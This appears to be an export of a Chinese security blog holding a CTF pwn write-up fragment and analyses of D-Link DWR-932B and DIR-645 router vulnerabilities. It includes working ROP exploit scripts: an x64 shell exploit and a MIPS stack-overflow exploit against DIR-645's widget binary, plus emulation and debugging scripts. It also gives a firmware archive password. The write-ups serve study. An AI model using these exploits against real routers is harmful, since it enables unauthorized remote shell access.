    system <span class="token operator">=</span> puts_addr<span class="token number">-0x2a300</span>
    binsh <span class="token operator">=</span> puts_addr <span class="token operator">+</span> <span class="token number">1169095</span>
    log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'system: '</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'\nbinsh: '</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>binsh<span class="token punctuation">)</span><span class="token punctuation">)</span>

    payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>binsh<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
    ia<span class="token punctuation">(</span><span class="token punctuation">)</span>

exploit<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
<p>read函数拷贝的地址可以不用是stack+0x20 = 0x58+7<em>8，因为在call调用read函数的时候，会把返回地址压入stack-112+0x50的位置，read的过程中，拷贝的地址如果能够覆盖该地址，就能实现控制程序执行流程，所以read的拷贝地址*</em>也就是第二个参数可以是stack-112+80<strong>，其实read结束的时候，已经把栈上的内容给换了，在read函数ret的时候，就能把覆盖后的返回地址弹给eip。</strong>如果怕不能精准控制，可以通过填充ret指令来缓冲下。**</p>
<pre class=" language-python"><code class="language-python">    payload <span class="token operator">=</span> flat<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">,</span> puts_got<span class="token punctuation">,</span> puts_plt<span class="token punctuation">)</span>
    <span class="token comment" spellcheck="true"># stack+0x20 = 0x58+7*8</span>
    <span class="token comment" spellcheck="true">#payload += call_function(read_got, 0, stack-0x70, 0x100)</span>
    payload <span class="token operator">+=</span> call_function<span class="token punctuation">(</span>read_got<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> stack<span class="token number">-112</span><span class="token operator">+</span><span class="token number">80</span><span class="token punctuation">,</span> <span class="token number">0x100</span><span class="token punctuation">)</span>
    payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x58</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>canary<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>stack<span class="token number">-0x70</span><span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>leave_ret<span class="token punctuation">)</span>
    <span class="token comment" spellcheck="true">#dbgya()</span>
    sda<span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>
    ru<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span>
    puts_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>rc<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span> hex<span class="token punctuation">(</span>puts_addr<span class="token punctuation">)</span>
    system <span class="token operator">=</span> puts_addr<span class="token number">-0x2a300</span>
    binsh <span class="token operator">=</span> puts_addr <span class="token operator">+</span> <span class="token number">1169095</span>
    log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'system: '</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'\nbinsh: '</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>binsh<span class="token punctuation">)</span><span class="token punctuation">)</span>
    ret <span class="token operator">=</span> <span class="token number">0x40087A</span>
    <span class="token comment" spellcheck="true">#payload = p64(ret)*11+p64(pop_rdi)+p64(binsh)+p64(system)</span>
    payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>binsh<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span></code></pre>
<p>还有两道，一道arm的堆溢出，一道UAF下次有时间再详细分析吧！</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>每次打比赛抱着学习的心态去学习就行了，不为成为赛棍，只为才艺精进，知识面拓展！</p>
<p>一直保持学习的状态，不断超越吧！</p>
<script>
        document.querySelectorAll('.github-emoji')
          .forEach(el => {
            if (!el.dataset.src) { return; }
            const img = document.createElement('img');
            img.style = 'display:none !important;';
            img.src = el.dataset.src;
            img.addEventListener('error', () => {
              img.remove();
              el.style.color = 'inherit';
              el.style.backgroundImage = 'none';
              el.style.background = 'none';
            });
            img.addEventListener('load', () => {
              img.remove();
            });
            document.body.appendChild(img);
          });
      </script>]]></content>
      <categories>
        <category>ctf</category>
      </categories>
  </entry>
  <entry>
    <title>D-Link DWR-932B相关漏洞分析</title>
    <url>/2020/06/18/d-link-dwr-932b-xiang-guan-lou-dong-fen-xi/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>有段时间没调试漏洞了，正好《IOT PENETRATION TESTING COOKBOOK》的译本《物联网渗透测试》出来了，买了一本看看，同时通过调洞静下心来吧！</p>
<h1 id="调试环境"><a href="#调试环境" class="headerlink" title="调试环境"></a>调试环境</h1><ul>
<li>ubuntu16.04 x64虚拟机：安装了常用的pwn环境，binwalk等工具用于路由器固件调试分析</li>
<li>IDA6.8：静态分析同时安装mipsrop插件寻找rop链，与gdb进行动态调试</li>
<li>Ghidra：反汇编反编译mips架构程序，目前只用于静态分析</li>
<li>qemu2.5：利用qemu的用户和系统模式运行固件</li>
<li>gdbserver：已经编译好的<a href="https://github.com/rapid7/embedded-tools/blob/master/binaries/gdbserver/gdbserver.mipsle" target="_blank" rel="noopener">gdbserver</a>，也可以自己编译生成</li>
<li>Firmadyne：全系统仿真工具，模拟运行路由器固件，本质还是基于qemu的系统模式</li>
<li>firmwalker：一些搜索固件解压出来的文件系统中的敏感信息的自动化脚本</li>
<li>固件下载：<a href="https://tsd.dlink.com.tw/" target="_blank" rel="noopener">https://tsd.dlink.com.tw/</a></li>
</ul>
<h1 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h1><p>根据研究员<em>pierre kim</em>的<a href="https://pierrekim.github.io/blog/2016-09-28-dlink-dwr-932b-lte-routers-vulnerabilities.html" target="_blank" rel="noopener">IT Security Research</a>，固件DWR-932_fw_revB_2_02_eu_en_20150709.zip, model revision B存在很多漏洞，漏洞总结如下：</p>
<ul>
<li>后门用户</li>
<li>后门</li>
<li>默认的WPS PIN</li>
<li>通过逆向算法，发现弱的WPS PIN生成算法</li>
<li>泄漏No-IP用户</li>
<li>HTTP守护进程(qmiweb)的多种漏洞</li>
<li>Remote FOTA (Firmware Over The Air)</li>
<li>Bad security pratices</li>
<li>Security removed in UPNP</li>
</ul>
<p>有意思的是，当时<em>pierre</em>的个人观点是，这些漏洞产生的原因要么是能力不足，要么就是故意留下的这些漏洞（毕竟包括很多后门漏洞）。</p>
<h1 id="测试流程"><a href="#测试流程" class="headerlink" title="测试流程"></a>测试流程</h1><p>第一步：获取固件提取文件系统，但是固件是加密之后的zip文件，利用fcrackzip工具暴力破解口令。我的fcrackzip使用报错：</p>
<p><img src="image-20200618110402238.png" alt=""></p>
<p>分析原因应该是zip文件不是完整的zip格式，所以无法解压。这里不再补齐它的完整格式，直接使用研究员用fcrackzip爆破的密码：beUT9z。</p>
<p>第二步：获取了固件镜像，解压之后有3个yaffs文件系统，直接用binwalk解压其中的2K-mdm-image-mdm9625.yaffs文件系统，这样就得到了完整的文件系统。</p>
<p>第三步：遍历文件系统中不同的目录，并从安全视角查找其中可能存在漏洞的文件，需要检查所有配置文件，可以利用find文件来查找所有.conf后缀名的文件。</p>
<p><img src="image-20200618111251322.png" alt=""></p>
<p>第四步：查看配置文件，例如./etc/inadyn-mt.conf，结果直接发现了敏感文件。</p>
<p><img src="image-20200618111417595.png" alt=""></p>
<p>这些信息本不应该被他人看见的，因为其中存储了no-IP配置信息，no-IP这是一种动态域名服务，配置文件包含了访问<a href="https://www.no-ip.com" target="_blank" rel="noopener">no-ip.com</a>的用户名和密码。现在肯定登录不了。。。</p>
<p>上面是手工的方法，自动化的方法就是利用firmwalker自动化脚本，搜索敏感信息。</p>
<p>接着的分析等待之后有空再继续吧。。。</p>
<p>其实整个现在分析下来没什么意思，而且看<a href="https://pierrekim.github.io/blog/2016-09-28-dlink-dwr-932b-lte-routers-vulnerabilities.html" target="_blank" rel="noopener">IT Security Research</a>发现里面没意思的洞太多了，调试分析起来没意思，不如直接审计反汇编代码挖洞去。</p>
<script>
        document.querySelectorAll('.github-emoji')
          .forEach(el => {
            if (!el.dataset.src) { return; }
            const img = document.createElement('img');
            img.style = 'display:none !important;';
            img.src = el.dataset.src;
            img.addEventListener('error', () => {
              img.remove();
              el.style.color = 'inherit';
              el.style.backgroundImage = 'none';
              el.style.background = 'none';
            });
            img.addEventListener('load', () => {
              img.remove();
            });
            document.body.appendChild(img);
          });
      </script>]]></content>
      <categories>
        <category>iot</category>
      </categories>
      <tags>
        <tag>dlink</tag>
        <tag>dwr-932b</tag>
      </tags>
  </entry>
  <entry>
    <title>DIR645缓冲区溢出分析</title>
    <url>/2020/05/29/dir645-huan-chong-qu-yi-chu-fen-xi/</url>
    <content><![CDATA[<h1 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h1><p><img src="https://pup2y.github.io/2020/05/29/dir645-huan-chong-qu-yi-chu-fen-xi/20171003235219534" alt=""></p>
<p>公告显示3个缓冲区溢出漏洞，下面一个个分析。</p>
<h1 id="调试环境"><a href="#调试环境" class="headerlink" title="调试环境"></a>调试环境</h1><ul>
<li>ubuntu16.04 x64虚拟机：安装了常用的pwn环境，binwalk等工具用于路由器固件调试分析</li>
<li>IDA6.8：静态分析同时安装mipsrop插件寻找rop链，与gdb进行动态调试</li>
<li>Ghidra：反汇编反编译mips架构程序，目前只用于静态分析</li>
<li>qemu2.5：利用qemu的用户和系统模式运行固件</li>
<li>gdbserver：已经编译好的<a href="https://github.com/rapid7/embedded-tools/blob/master/binaries/gdbserver/gdbserver.mipsle" target="_blank" rel="noopener">gdbserver</a>，也可以自己编译生成</li>
<li>Firmadyne：全系统仿真工具，模拟运行路由器固件，本质还是基于qemu的系统模式</li>
<li>固件下载：<a href="ftp://ftp2.dlink.com/PRODUCTS/DIR-645/REVA/DIR-645_FIRMWARE_1.03.ZIP">ftp://ftp2.dlink.com/PRODUCTS/DIR-645/REVA/DIR-645_FIRMWARE_1.03.ZIP</a></li>
</ul>
<h1 id="Buffer-overflow-on-“post-login-xml”"><a href="#Buffer-overflow-on-“post-login-xml”" class="headerlink" title="Buffer overflow on “post_login.xml”"></a>Buffer overflow on “post_login.xml”</h1><h2 id="漏洞介绍-1"><a href="#漏洞介绍-1" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><blockquote>
<p>Buffer overflow on “post_login. xml”<br>Invoking the “post_login. xml”server-side script, attackers can specify a “hash”password value that is used to authenticate the user. This hash value is eventually processed by the “/usr/sbin/widget”local binary. However, the latter copies the user-controlled hash into a statically-allocated buffer, allowing attackers to overwrite ad jacent memory locations.</p>
</blockquote>
<p>漏洞公告：攻击者调用<code>post_login.xml</code>服务端脚本时，可以指定用于验证用户身份的hash值，这个hash值最终被<code>/usr/sbin/widget</code>程序处理，该程序会将程序控制的hash值复制到静态分配的缓冲区中，从而覆盖相邻的内存地址。</p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>根据公告可知：需要分析<code>post_login.xml</code>和<code>/usr/sbin/widget</code>这两个文件，以及它们如何处理用户输入的hash。</p>
<p><code>find . -name "post_login.xml"</code>，文件在<code>/htdocs/web/post_login.xml</code>。</p>
<p>该xml文件是为了支持widget登录检测。代码意思是：接收GET请求传递的hash值并写入<code>/var/run/hash</code>文件，获取password写入<code>/var/run/password</code>，通过<code>/runtime/widgetv2/logincheck</code>判断login是否正确。</p>
<pre class=" language-xml"><code class="language-xml">#/htdocs/web/post_login.xml

HTTP/1.1 200 OK
Content-Type: text/xml

<span class="token prolog">&lt;?
/*
* Created by Kwest Wan 20071012
* to support D-Link widget login check
*/
$hash = $_GET["hash"];
$xml_head = fread("", "/htdocs/web/__login_head.xml");
$file = "/var/run/password";
$password = query("/device/account/entry:1/password");
fwrite("w", $file, $password);
fwrite("w", "/var/run/hash", $hash);
$logined = "error";
$logined = query("/runtime/widgetv2/logincheck");

if($logined == "OK")
{
    $response = "OK"; 
}
else
{
    $response = "error";
}

echo $xml_head."&lt;login>".$response."&lt;/login>";
?></span></code></pre>
<p>解压出来的文件系统中找不到<code>/runtime/widgetv2/logincheck</code>，应该是运行过程中产生的文件，根据公告提示与此关联的二进制文件是<code>usr/bin/widget</code>，能够利用qemu用户模式模拟执行了解其功能：-s 生成salt，-a 生成登录hash的密码文件。</p>
<p><img src="https://pup2y.github.io/2020/05/29/dir645-huan-chong-qu-yi-chu-fen-xi/image-20200606082601324.png" alt=""></p>
<p>直接利用Ghidra打开<code>usr/bin/widget</code>进行分析。</p>
<p><img src="https://pup2y.github.io/2020/05/29/dir645-huan-chong-qu-yi-chu-fen-xi/image-20200606082135298.png" alt=""></p>
<p>直接进入main函数，遇到getopt函数，该函数的定义和作用可以参考<a href="https://www.cnblogs.com/chenliyang/p/6633739.html" target="_blank" rel="noopener">文章</a>为：</p>
<pre class=" language-txt"><code class="language-txt">1.定义：
int getopt(int argc, char * const argv[], const char *optstring);
2.参数：
argc：main()函数传递过来的参数的个数
argv：main()函数传递过来的参数的字符串指针数组
optstring：选项字符串，告知 getopt()可以处理哪个选项以及哪个选项需要参数
3.返回：
如果选项成功找到，返回选项字母；如果所有命令行选项都解析完毕，返回 -1；如果遇到选项字符不在 optstring 中，返回字符 '?'；如果遇到丢失参数，那么返回值依赖于 optstring 中第一个字符，如果第一个字符是 ':' 则返回':'，否则返回'?'并提示出错误信息。
4.举例说明选项字符串optstring的意义：
char*optstring = “ab:c::”;
单个字符a         表示选项a没有参数            格式：-a即可，不加参数
单字符加冒号b:     表示选项b有且必须加参数      格式：-b 100或-b100,但-b=100错
单字符加2冒号c::   表示选项c可以有，也可以无     格式：-c200，其它格式错误

optarg —— 指向当前选项参数(如果有)的指针。
optind —— 再次调用 getopt() 时的下一个 argv指针的索引。
optopt —— 最后一个未知选项。
opterr —— 如果不希望getopt()打印出错信息，则只要将全域变量opterr设为0即可。</code></pre>
<p>继续分析，getopt()获取了命令行参数，会进行判断，如果是-a选项，则会一直往下运行至<code>FUN_004009f0("/var/run/hash",&amp;local_128);</code></p>
<pre class=" language-txt"><code class="language-txt">iVar4 = getopt(param_1,param_2,"a:shv"), 0 < iVar4
if (iVar4 == 0x61) {//判断选项字符是否是'a'
    iVar6 = 1;
    uVar7 = optarg;
}
...
memset(&local_128,0,0x100);
FUN_004009f0("/var/run/hash",&local_128);
memset(&local_380,0,0x40);
local_37c = local_124;
local_380 = local_128;
memset(auStack832,0,0x40);
FUN_004009f0(uVar7,auStack832);</code></pre>
<p>进入FUN_004009f0(“/var/run/hash”,&amp;local_128)。两个参数分别是<code>/var/run/hash</code>和栈上的地址<code>local_128</code>缓冲区大小为0x100。</p>
<pre class=" language-c"><code class="language-c">undefined4 <span class="token function">FUN_004009f0</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>param_1<span class="token punctuation">,</span><span class="token keyword">void</span> <span class="token operator">*</span>param_2<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">int</span> __fd<span class="token punctuation">;</span>
  size_t sVar1<span class="token punctuation">;</span>
  stat sStack168<span class="token punctuation">;</span>

  __fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span>param_1<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>__fd <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Can\'t open file %s.\n"</span><span class="token punctuation">,</span>param_1<span class="token punctuation">)</span><span class="token punctuation">;</span>
    __fd <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">else</span> <span class="token punctuation">{</span>
    <span class="token function">fstat</span><span class="token punctuation">(</span>__fd<span class="token punctuation">,</span><span class="token operator">&amp;</span>sStack168<span class="token punctuation">)</span><span class="token punctuation">;</span>
    sVar1 <span class="token operator">=</span> <span class="token function">read</span><span class="token punctuation">(</span>__fd<span class="token punctuation">,</span>param_2<span class="token punctuation">,</span>sStack168<span class="token punctuation">.</span>st_blocks<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>sVar1 <span class="token operator">==</span> sStack168<span class="token punctuation">.</span>st_blocks<span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token function">close</span><span class="token punctuation">(</span>__fd<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"read error."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">close</span><span class="token punctuation">(</span>__fd<span class="token punctuation">)</span><span class="token punctuation">;</span>
    __fd <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
                    <span class="token comment" spellcheck="true">/* WARNING: Subroutine does not return */</span>
  <span class="token function">exit</span><span class="token punctuation">(</span>__fd<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>先打开了<code>/var/run/hash</code>，然后利用fstat将打开的文件状态存入sStack168，之后将文件中的内容读取到第二个参数<code>local_128</code>中，而之前在分析<code>post_login.xml</code>的时候知道，我们通过get方式传入的hash值被写进了<code>/var/run/hash</code>。而且没有对hash值做长度限制就直接拷贝到栈上，这就导致了栈溢出。</p>
<p>程序往下执行会再一次调用FUN_004009f0()，</p>
<p><img src="https://pup2y.github.io/2020/05/29/dir645-huan-chong-qu-yi-chu-fen-xi/image-20200606111858498.png" alt=""></p>
<p>这里的第一个uVar7是命令-a 的参数：生成登录hash的密码文件。这可以是我们输入的文件名，但是需要里面有内容，这样open不会报错。根据<code>post_login.xml</code>可知真实环境中应该是/var/run/password。手上没有真实机器所以就随便创建一个文件。</p>
<p><img src="https://pup2y.github.io/2020/05/29/dir645-huan-chong-qu-yi-chu-fen-xi/image-20200606112103650.png" alt=""></p>
<p>因为真实环境中我们能控制的只有/var/run/hash。所以溢出点是调用FUN_004009f0(“/var/run/hash”,&amp;local_128)。</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>整个漏洞利用过程是</p>
<ul>
<li>劫持PC，通过调试确定缓冲区大小，定位并确定控制偏移</li>
<li>确定攻击路径，构造ROP链</li>
<li>编写exp,getshell</li>
</ul>
<h3 id="劫持PC，确定偏移"><a href="#劫持PC，确定偏移" class="headerlink" title="劫持PC，确定偏移"></a>劫持PC，确定偏移</h3><p>利用patternLocOffset.py生成context文件，包含特定格式的2000个字符串。</p>
<p><code>python patternLocOffset.py -c -l 2000 -f context</code></p>
<p>测试脚本run.sh，因为解压的固件中没有/var/run文件夹所以需要手工创建，print函数默认在每行结尾加上换行，利用tr -d ‘\n’删除换行。经过尝试从context中读取400个字节不会报错。</p>
<pre class=" language-sh"><code class="language-sh">#!/bin/bash
mkdir ./var/run
python -c "print open('context','r').read(400)" | tr -d '\n' > ./var/run/hash
echo -n 'aaaa' > temp
cp $(which qemu-mipsel-static) ./qemu 
chroot . ./qemu -g 23957 /usr/sbin/widget -a temp
rm -f ./qemu
rm -rf ./var/run</code></pre>
<p>执行命令：</p>
<pre class=" language-sh"><code class="language-sh">sudo ./run.sh </code></pre>
<p>使用IDA或者gdb-multiarch联调运行到main()返回时ra寄存器中的值为0x6A41376A。</p>
<p><code>./patternLocOffset.py -s 0x6A41376A -l 2000</code>确定偏移为292。</p>
<p>因为程序结构比较简单，函数嵌套不多，也可以通过ghidra或者IDA手工计算偏移：read的第二个参数是<code>$sp, 0x3A8+var_128</code>，而ra的值通过<code>sw      $ra, 0x3A8+var_4($sp)</code>存储在0x3A8+var_4($sp)，两者相差0x128-0x4=292。</p>
<p>在覆盖返回地址的时候，因为FUN_004009f0()是非叶子函数，该函数的ra也会保存在栈中，所以能否通过覆盖当前函数FUN_004009f0()的返回地址来劫持PC呢？</p>
<p>从下图可以看出，进入函数后，程序先是<code>addiu   $sp, -0xC0</code>新开辟了0xc0大小的栈空间，然后将ra存储在<code>0xC0+var_4($sp)</code>的地方。而read的第二个参数存储的偏移应该是0x3a8-0x128+0x4=644，但是参数的位置比当前函数ra位置高，而在填充栈的时候是往高地址填充，不可能会覆盖到低地址的ra。因此只能覆盖main函数的ra来劫持PC。</p>
<p><img src="https://pup2y.github.io/2020/05/29/dir645-huan-chong-qu-yi-chu-fen-xi/image-20200606233414737.png" alt=""></p>
<h3 id="选择攻击路径构造ROP链"><a href="#选择攻击路径构造ROP链" class="headerlink" title="选择攻击路径构造ROP链"></a>选择攻击路径构造ROP链</h3><p>因为在ubuntu16.04上构造的exp打不通，换了kali虚拟机进行调试，先找到调用了哪个动态链接库libc.so，然后找到其基地址：</p>
<pre class=" language-sh"><code class="language-sh">gdb-multiarch usr/sbin/widget
set architecture mips
target remote :23957
b *0x00400E74  #main()函数返回jr ra处
c
vmmap</code></pre>
<p>调试发现qemu用户模式使用的libc是libuClibc-0.9.30.1.so基地址为0x7f738000。</p>
<pre class=" language-sh"><code class="language-sh">pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
......
0x7f738000 0x7f739000 rwxp     1000 0      /root/桌面/IoT/D-Link/DIR645/dir645-v103/_dir645_FW_103.bin.extracted/squashfs-root/lib/libuClibc-0.9.30.1.so
0x7f739000 0x7f796000 r-xp    5d000 1000   /root/桌面/IoT/D-Link/DIR645/dir645-v103/_dir645_FW_103.bin.extracted/squashfs-root/lib/libuClibc-0.9.30.1.so</code></pre>
<p>在main()函数返回时能覆盖fp,s0-s7,ra寄存器，所以接下来构造rop过程跟DIR815也是一样的。具体可以参考<a href="https://www.anquanke.com/post/id/206626#h3-7" target="_blank" rel="noopener">之前的文章</a>。</p>
<p><img src="https://pup2y.github.io/2020/05/29/dir645-huan-chong-qu-yi-chu-fen-xi/image-20200606235811264.png" alt=""></p>
<h4 id="通过system函数getshell"><a href="#通过system函数getshell" class="headerlink" title="通过system函数getshell"></a>通过system函数getshell</h4><p>整个流程如下，</p>
<p><img src="https://pup2y.github.io/2020/05/29/dir645-huan-chong-qu-yi-chu-fen-xi/image-20200531102945201.png" alt=""></p>
<p>构造的exp如下：</p>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python2</span>
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
context<span class="token punctuation">.</span>endian <span class="token operator">=</span> <span class="token string">"little"</span>
context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">"mips"</span>
base_addr <span class="token operator">=</span> <span class="token number">0x7f738000</span>
system_addr_1 <span class="token operator">=</span> <span class="token number">0x53200</span><span class="token operator">-</span><span class="token number">1</span>
gadget1 <span class="token operator">=</span> <span class="token number">0x45988</span>
gadget2 <span class="token operator">=</span> <span class="token number">0x159cc</span>
padding <span class="token operator">=</span> <span class="token string">'A'</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">292</span><span class="token operator">-</span><span class="token number">4</span><span class="token operator">*</span><span class="token number">9</span><span class="token punctuation">)</span> 
padding <span class="token operator">+=</span> p32<span class="token punctuation">(</span>base_addr <span class="token operator">+</span> system_addr_1<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># s0</span>
padding <span class="token operator">+=</span> p32<span class="token punctuation">(</span>base_addr <span class="token operator">+</span> gadget2<span class="token punctuation">)</span>       <span class="token comment" spellcheck="true"># s1</span>
padding <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                        <span class="token comment" spellcheck="true"># s2</span>
padding <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                        <span class="token comment" spellcheck="true"># s3</span>
padding <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                        <span class="token comment" spellcheck="true"># s4</span>
padding <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                           <span class="token comment" spellcheck="true"># s5</span>
padding <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                        <span class="token comment" spellcheck="true"># s6</span>
padding <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                        <span class="token comment" spellcheck="true"># s7</span>
padding <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                        <span class="token comment" spellcheck="true"># fp</span>
padding <span class="token operator">+=</span> p32<span class="token punctuation">(</span>base_addr <span class="token operator">+</span> gadget1<span class="token punctuation">)</span>       <span class="token comment" spellcheck="true"># ra</span>
padding <span class="token operator">+=</span> <span class="token string">'B'</span> <span class="token operator">*</span> <span class="token number">0x10</span>
padding <span class="token operator">+=</span> <span class="token string">'/bin/sh'</span>

<span class="token keyword">print</span> padding</code></pre>
<p>构造脚本调试</p>
<pre class=" language-sh"><code class="language-sh">#!/bin/bash
mkdir ./var/run
#python -c "print open('context','r').read(400)" | tr -d '\n' > ./var/run/hash
python exp.py | tr -d '\n' > ./var/run/hash
echo -n 'aaaa' > temp
cp $(which qemu-mipsel-static) ./qemu 
chroot . ./qemu /usr/sbin/widget -a temp
rm -f ./qemu
rm -rf ./var/run</code></pre>
<p>能够成功getshell。</p>
<p><img src="https://pup2y.github.io/2020/05/29/dir645-huan-chong-qu-yi-chu-fen-xi/image-20200607214419824.png" alt=""></p>
<h1 id="Buffer-overflow-on-“hedwig-cgi”"><a href="#Buffer-overflow-on-“hedwig-cgi”" class="headerlink" title="Buffer overflow on “hedwig.cgi”"></a>Buffer overflow on “hedwig.cgi”</h1><p>跟之前分析的DIR815目标一样都是hedwig.cgi，而且漏洞产生原因都是超长的cookie，所以调试过程几乎一样，唯一的区别可能是偏移会不同，调试脚本test.sh如下：</p>
<pre class=" language-sh"><code class="language-sh">#!/bin/bash
#sudo ./test.sh  "uid=1234"  `python -c "print 'uid=' + open('content','r').read()"`

INPUT="$1"
COOKIE="$2"
PORT="23957"
LEN=$(echo -n "$INPUT" | wc -c)
cp $(which qemu-mipsel-static) ./qemu

echo $INPUT | sudo chroot . ./qemu -E CONTENT_LENGTH=$LEN -E CONTENT_TYPE="application/x-www-form-urlencoded" -E REQUEST_METHOD="POST" -E HTTP_COOKIE=$COOKIE -E REQUEST_URI="/hedwig.cgi" -E REMOTE_ADDR="127.0.0.1" -g $PORT /htdocs/web/hedwig.cgi
rm -f ./qemu</code></pre>
<p>也需要提前在<code>/var</code>文件夹下创建<code>/tmp</code>文件夹否则到不了真正的漏洞触发函数第二个<code>sprintf()</code>，还需要利用<code>patternLocOffset.py</code>脚本创建content文件计算偏移，</p>
<p><code>./patternLocOffset.py -c -l 2000 -f content</code></p>
<p>之后利用<code>tesh.sh</code>结合gdb-multiarch或者IDA进行远程调试计算偏移，</p>
<pre class=" language-sh"><code class="language-sh">sudo ./test.sh  "uid=1234"  `python -c "print 'uid=' + open('content','r').read()"`</code></pre>
<p>具体调试过程跟<a href="https://www.anquanke.com/post/id/206626#h3-7" target="_blank" rel="noopener">DIR815缓冲区溢出漏洞再分析</a>过程一样，调试发现偏移也是1009，这样的话整个exp也跟815完全一样，经测试确实如此。</p>
<h1 id="Buffer-overflow-on-“authentication-cgi”"><a href="#Buffer-overflow-on-“authentication-cgi”" class="headerlink" title="Buffer overflow on “authentication.cgi”"></a>Buffer overflow on “authentication.cgi”</h1><h2 id="漏洞介绍-2"><a href="#漏洞介绍-2" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><blockquote>
<pre><code>Buffer overflow on "authentication. cgi"
The third buffer overflow vulnerability affects the "authentication. cgi"CGI script. This time the issue affects the HTTP POST paramter named "password". Again, this vulnerability can be abused to achieve remote code execution. As for all the previous issues, no authentication is required.</code></pre></blockquote>
<p>该缓冲区溢出漏洞存在于<code>authentication. cgi</code>脚本中，产生原因是HTTP的<strong>POST</strong>参数中<strong>password</strong>参数值过长，攻击者能够利用该漏洞在<strong>不需要身份验证</strong>条件下<strong>远程命令执行</strong>。</p>
